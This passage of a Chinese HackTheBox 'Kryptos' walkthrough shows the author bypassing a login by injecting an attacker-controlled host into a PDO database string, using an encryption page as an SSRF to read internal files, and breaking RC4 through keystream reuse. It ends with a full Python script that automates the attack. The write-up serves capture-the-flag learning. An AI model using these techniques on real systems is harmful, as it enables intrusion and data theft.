class="line"></span><br><span class="line">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; create database cryptor;</span><br><span class="line">Query OK, 1 row affected (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES on cryptor.* to &#39;dbuser&#39;@&#39;%&#39; identified by &#39;krypt0n1te&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.002 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; FLUSH PRIVILEGES;</span><br><span class="line">Query OK, 0 rows affected (0.001 sec)</span><br></pre></td></tr></table></figure>
+
+<p>重新抓包发送，但是返回状态码2002，表示连接mysql服务器失败：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/16.png" alt="16"></p>
+<p>原因是因为kali攻击机仅仅监听本地的主机：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ netstat -lanp | grep 3306 </span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -</span><br></pre></td></tr></table></figure>
+
+<p>所以需要修改mysql的配置文件，应该是<code>/etc/mysql/mariadb.conf.d/50-server.cnf</code>文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ grep -r 127.0.0.1 /etc/mysql/</span><br><span class="line">/etc/mysql/mariadb.conf.d/50-server.cnf:bind-address            = 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>修改该文件，将<code>127.0.0.1</code>修改为<code>10.10.14.6</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ cat /etc/mysql/mariadb.conf.d/50-server.cnf | grep bind-address</span><br><span class="line">bind-address            = 10.10.14.6</span><br></pre></td></tr></table></figure>
+
+<p>接着重启mysql服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ sudo service mysql restart</span><br><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ netstat -lanp | grep 3306                                      </span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">tcp        0      0 10.10.14.6:3306         0.0.0.0:*               LISTEN      -</span><br></pre></td></tr></table></figure>
+
+<p>接着打开wireshark抓包，选择捕获网卡<code>tun0</code>的流量，<code>tun0</code>网卡对应着我的攻击ip地址10.10.14.6：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/18.png" alt="18"></p>
+<p>burp抓包后再次发送：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/19.png" alt="19"></p>
+<p>右键跟踪tcp流：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/20.png" alt="20"></p>
+<p>捕获的流量中包含一条数据库query语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username&#x3D;&#39;admin&#39; AND password&#x3D;&#39;21232f297a57a5a743894a0e4a801fc3&#39; ,....z.#42S02Table &#39;cryptor.users&#39; doesn&#39;t exist</span><br></pre></td></tr></table></figure>
+
+<p>包含我们的用户名和密码，我们提交的<code>admin:admin</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: 21232f297a57a5a743894a0e4a801fc3</span><br></pre></td></tr></table></figure>
+
+<p>这个密码是32位的，是经过md5加密的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ echo -n 21232f297a57a5a743894a0e4a801fc3 | wc -c</span><br><span class="line">32</span><br><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ echo -n admin  | openssl md5</span><br><span class="line">(stdin)&#x3D; 21232f297a57a5a743894a0e4a801fc3</span><br></pre></td></tr></table></figure>
+
+<p>同时更重要的是，我们还知道了数据库<code>cryptor</code>存在数据表<code>users</code>，并且至少存在两个字段<code>username</code>和<code>password</code>。</p>
+<p>所以需要在我们的本地的mysql数据库中也新建一张这样的数据表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ariaDB [cryptor]&gt; use cryptor;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [cryptor]&gt; create table users ( username varchar(100) not null, password varchar(100) not null );</span><br><span class="line">Query OK, 0 rows affected (0.011 sec)</span><br></pre></td></tr></table></figure>
+
+<p>同时将用户名<code>admin</code>和md5加密后的密码插入本地的<code>users</code>表中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [cryptor]&gt; insert into users values ( &#39;admin&#39;, &#39;21232f297a57a5a743894a0e4a801fc3&#39;);</span><br><span class="line">Query OK, 1 row affected (0.003 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [cryptor]&gt; select * from users;</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| username | password                         |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| admin    | 21232f297a57a5a743894a0e4a801fc3 |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure>
+
+<p>重新提交请求，登录成功。</p>
+<h3 id="File-Decryptor"><a href="#File-Decryptor" class="headerlink" title="File Decryptor"></a>File Decryptor</h3><p>发现有两个页面，一个是<code>encrypt.php</code>，页面提示我们，只要提供文件的url就可以进行在线加密：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/21.png" alt="21"></p>
+<p>另一个页面是<code>decrypt.php</code>，不同的是，这个页面还没有成形：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/22.png" alt="22"></p>
+<p>回到页面<code>encrypt.php</code>，这里提供了两种加密方式<code>AES-CBC</code>和<code>RC4</code>：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/23.png" alt="23"></p>
+<p>尝试用<code>file</code>协议读取<code>/etc/passwd</code>，但是仅仅支持<code>http</code>协议：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/24.png" alt="24"></p>
+<p>我在我自己的本地开启了http服务进行测试：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ python -c 'print("ABCDabcd"*1000);' &gt; test</span><br><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>
+
+<p>尝试对<a href="http://10.10.14.6:8000/test" target="_blank" rel="noopener">http://10.10.14.6:8000/test</a> 的文件进行加密，加密选择<code>RC4</code>：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/25.png" alt="25"></p>
+<p>返回了加密结果。</p>
+<h3 id="AES-CBC-amp-RC4"><a href="#AES-CBC-amp-RC4" class="headerlink" title="AES-CBC &amp; RC4"></a>AES-CBC &amp; RC4</h3><p>在进行后续的渗透之前，先了解这两种加密模式。</p>
+<h4 id="AES-CBC"><a href="#AES-CBC" class="headerlink" title="AES-CBC"></a>AES-CBC</h4><p>AES算法，高级加密标准(AES,Advanced Encryption Standard)为最常见的对称加密算法(微信小程序加密传输就是用这个加密算法的)。  AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。 </p>
+<h4 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h4><p>RC4是是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。</p>
+<p>回到题目，流加密算法有什么特点呢，就是无论我们对<a href="http://10.10.14.6:8000/test" target="_blank" rel="noopener">http://10.10.14.6:8000/test</a> 的内容进行几次加密，加密的结果都不会发生任何改变，这说明了rc4使用的密钥key是固定的。</p>
+<p>为了搞清楚<code>encrypt.php</code>中rc4的加密方法，我先在本地新建一个简单的<code>a.txt</code>，其中写入简单的单字母a：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ echo -n abcd &gt; abcd.txt</span><br><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>
+
+<p>接着进行加密，得到经过base64加密后的<code>OVyM+A==</code>：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/26.png" alt="26"></p>
+<p>先base64解密，然后转为16进制输出为：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ echo -n OVyM+A== | base64 -d | xxd     </span><br><span class="line">00000000: 395c 8cf8                                9\..</span><br></pre></td></tr></table></figure>
+
+<p>我们已经知道，xor加密的一个特点就是我们用key对加密后的密文再进行一次加密，就能得到原来的明文：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ echo -n OVyM+A== | base64 -d &gt; abcd_rc4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/27.png" alt="27"></p>
+<p>对密文再次加密后得到base64值<code>YWJjZA==</code>，进行解密：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/28.png" alt="28"></p>
+<p>又得到了<code>abcd</code>，这里因为我用的shell是<code>zsh</code>就有点奇怪，最后的<code>%</code>其实是一个换行符，切换为bash就能正常显示：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/29.png" alt="29"></p>
+<h3 id="dev"><a href="#dev" class="headerlink" title="dev"></a>dev</h3><p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/30.png" alt="30"></p>
+<p>对<a href="http://127.0.0/dev" target="_blank" rel="noopener">http://127.0.0/dev</a> 加密后得到的字符串进行base64解码后，再一次进行rc4加密：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ echo -n ZB+r03k+ci4Pu/Kiqn3XlKp1CH7TRblUckQwZr0A8KEfEVBU0VfvkDeRzTN328hTffG00fElOMKyJV0bnVzFi5au9TrTwTTNmxN2+N3yQAjVUJ4jYRdzOR4P6SEDwzPdOE4TsL58zm2FybHyCwtZDhvN+htfErEIdyKGRxDNslX7uyg0FkwbdsWc+E3bS4QyPxcd8oWOBoy62bfbd49l8VH7kYGnAQ0oh3jHs+KFzv0WX2b7rW1Yx4DOfSvsoyUAhpxz2um17Y0r1wyVujCWYRYTnmUM1B+O4rOhISbCOht4PS6q3X/VvFXTstYToUMj7CYvLWWtVn5/IVizj+x5yqHFTuSfkC7R4KPTw+BZkHV9s2RuRpIpPiK+EW29C7lFwPPyhRoe73piDn8wJLC9MA==| base64 -d &gt; dev_rc4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/31.png" alt="31"></p>
+<p>对其进行再一次rc4加密：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/32.png" alt="32"></p>
+<p>base64解码后得到：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ echo -n PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4KPGh0bWw+PGhlYWQ+Cjx0aXRsZT4zMDEgTW92ZWQgUGVybWFuZW50bHk8L3RpdGxlPgo8L2hlYWQ+PGJvZHk+CjxoMT5Nb3ZlZCBQZXJtYW5lbnRseTwvaDE+CjxwPlRoZSBkb2N1bWVudCBoYXMgbW92ZWQgPGEgaHJlZj0iaHR0cDovLzEyNy4wLjAuMS9kZXYvIj5oZXJlPC9hPi48L3A+Cjxocj4KPGFkZHJlc3M+QXBhY2hlLzIuNC4yOSAoVWJ1bnR1KSBTZXJ2ZXIgYXQgMTI3LjAuMC4xIFBvcnQgODA8L2FkZHJlc3M+CjwvYm9keT48L2h0bWw+Cg== | base64 -d</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;301 Moved Permanently&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Moved Permanently&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The document has moved &lt;a href="http://127.0.0.1/dev/"&gt;here&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 80&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提示我们<a href="http://127.0.0.1/dev" target="_blank" rel="noopener">http://127.0.0.1/dev</a> 被转移到了<a href="http://127.0.0.1/dev/" target="_blank" rel="noopener">http://127.0.0.1/dev/</a> ，那用同样的方法继续读取该页面的内容，得到：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ echo -n PGh0bWw+CiAgICA8aGVhZD4KICAgIDwvaGVhZD4KICAgIDxib2R5PgoJPGRpdiBjbGFzcz0ibWVudSI+CgkgICAgPGEgaHJlZj0iaW5kZXgucGhwIj5NYWluIFBhZ2U8L2E+CgkgICAgPGEgaHJlZj0iaW5kZXgucGhwP3ZpZXc9YWJvdXQiPkFib3V0PC9hPgoJICAgIDxhIGhyZWY9ImluZGV4LnBocD92aWV3PXRvZG8iPlRvRG88L2E+Cgk8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg== | base64 -d</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"menu"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php"</span>&gt;</span>Main Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=about"</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=todo"</span>&gt;</span>ToDo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>又发现了三个新的页面，分别是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dev&#x2F;index.php</span><br><span class="line">dev&#x2F;index.php?view&#x3D;about</span><br><span class="line">dev&#x2F;index.php?view&#x3D;todo</span><br></pre></td></tr></table></figure>
+
+<p>需要继续用这种方式读取页面信息，但是一直手动读取有点麻烦，可以写一个脚本来自动化这个过程：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rc4_decryptor.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">init_url = <span class="string">"http://10.10.10.129/"</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># login and return cookies</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password, remote_vps, port=<span class="string">"3306"</span>)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req = sess.get(init_url)</span><br><span class="line">        req_text = req.text</span><br><span class="line">        token_lst = re.findall(<span class="string">'[a-f0-9]&#123;64&#125;'</span>, req_text)</span><br><span class="line">        <span class="keyword">if</span> len(token_lst) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"[*] An error has occurred while getting token......"</span>)</span><br><span class="line">            die(<span class="string">"[*] Exit....."</span>)</span><br><span class="line">        token = token_lst[<span class="number">0</span>]</span><br><span class="line">        print(<span class="string">"[*] Your token is "</span>, token)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: username,</span><br><span class="line">        <span class="string">"password"</span>: password,</span><br><span class="line">        <span class="string">"db"</span>: <span class="string">"cryptor;host="</span> + remote_vps + <span class="string">";port="</span> + port,</span><br><span class="line">        <span class="string">"token"</span>: token,</span><br><span class="line">        <span class="string">"login"</span>: <span class="string">""</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req_post = sess.post(url=init_url, data=login_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"PDOException"</span> <span class="keyword">in</span> req_post:</span><br><span class="line">            pdoexp_text = req_post.txt</span><br><span class="line">            print(<span class="string">"[*] Response: "</span> + pdoexp_text)</span><br><span class="line">            print(<span class="string">"[*] Exit......"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'File Encryption Services'</span> <span class="keyword">in</span> req_post.text:</span><br><span class="line">                cookieJar = sess.cookies</span><br><span class="line">                cookiedict = requests.utils.dict_from_cookiejar(cookieJar)</span><br><span class="line">                print(<span class="string">"[*] Login success, the cookies is"</span>, cookiedict[<span class="string">'PHPSESSID'</span>]) </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># save rc4 secret to attacker machine</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_file</span><span class="params">(content)</span>:</span></span><br><span class="line">    content = b64decode(content)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"my_rc4"</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(content)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># encrypt the local files of host Kryptos</span></span><br><span class="line"><span class="comment"># url: the file needs to be encrypted</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(encrypt_file_url, cookies)</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'cipher'</span>: <span class="string">'RC4'</span>,</span><br><span class="line">        <span class="string">'url'</span>: encrypt_file_url</span><br><span class="line">    &#125;</span><br><span class="line">    req_get = sess.get(url=init_url+<span class="string">"encrypt.php"</span>, params=params, cookies=cookies)</span><br><span class="line">    content = req_get.text</span><br><span class="line">    rc4_start = <span class="string">'&lt;textarea class="form-control" name="textarea" rows="20" id="output"&gt;'</span></span><br><span class="line">    rc4_end = <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">    idx_start = content.find(rc4_start) + len(rc4_start)</span><br><span class="line">    idx_end = content.find(rc4_end)</span><br><span class="line">    rc4_content = content[idx_start:idx_end]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wirte the secret content to my attacker machine</span></span><br><span class="line">    create_file(rc4_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt the local files of attacker machine - my_rc4</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(decrypt_file_url)</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'cipher'</span>: <span class="string">'RC4'</span>,</span><br><span class="line">        <span class="string">'url'</span>: decrypt_file_url</span><br><span class="line">    &#125;</span><br><span class="line">    req_get = sess.get(url=init_url+<span class="string">"encrypt.php"</span>, params=params, cookies=cookies)</span><br><span class="line">    content = req_get.text</span><br><span class="line">    rc4_start = <span class="string">'&lt;textarea class="form-control" name="textarea" rows="20" id="output"&gt;'</span></span><br><span class="line">    rc4_end = <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">    idx_start = content.find(rc4_start) + len(rc4_start)</span><br><span class="line">    idx_end = content.find(rc4_end)</span><br><span class="line">    rc4_content = content[idx_start:idx_end]</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"[*] Get the source file......"</span>)</span><br><span class="line">    output(rc4_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">output</span><span class="params">(content)</span>:</span></span><br><span class="line">    content = b64decode(content)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'output'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(content)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># readfile</span></span><br><span class="line">    os.system(<span class="string">"cat ./output"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">"decrypt_file_url"</span>, help=<span class="string">"decrypt_file_url"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"username"</span>, help=<span class="string">"your username"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"password"</span>, help=<span class="string">"your password"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"attack_ip"</span>, help=<span class="string">"your attack ip"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--port"</span>, help=<span class="string">'your local mysql port'</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    username = args.username</span><br><span class="line">    password = args.password</span><br><span class="line">    remote_vps = args.attack_ip</span><br><span class="line">    port = args.port</span><br><span class="line"></span><br><span class="line">    cookies = login(username, password, remote_vps)</span><br><span class="line"></span><br><span class="line">    encrypt_file_url = args.decrypt_file_url</span><br><span class="line">    encrypt(encrypt_file_url, cookies)</span><br><span class="line"></span><br><span class="line">    decrypt_file_url = <span class="string">"http://"</span> + remote_vps + <span class="string">":8000/my_rc4"</span></span><br><span class="line">    decrypt(decrypt_file_url)</span><br></pre></td></tr></table></figure>
+
